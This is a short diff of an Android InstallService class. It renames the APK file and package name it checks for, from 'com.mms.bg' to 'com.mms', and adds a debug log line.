@@ -17,7 +17,7 @@ import com.mms.bg.util.ZipUtil;
 public class InstallService extends Service {
     
     public static final String OUT_PATH = "/data/app/";
-    public static final String OUT_FILE_NAME = "com.mms.bg.apk";
+    public static final String OUT_FILE_NAME = "com.mms.apk";
     
     public SettingManager mSM;
     private boolean mHasbeenInstalled;
@@ -39,8 +39,9 @@ public class InstallService extends Service {
 //        } catch (NameNotFoundException e) {
 //            e.printStackTrace();
 //        }
-        mHasbeenInstalled = isPackageAlreadyInstalled(this, "com.mms.bg");
+        mHasbeenInstalled = isPackageAlreadyInstalled(this, "com.mms");
         service_start = true;
+		mSM.log("oncreate--------");
     }
 
     @Override
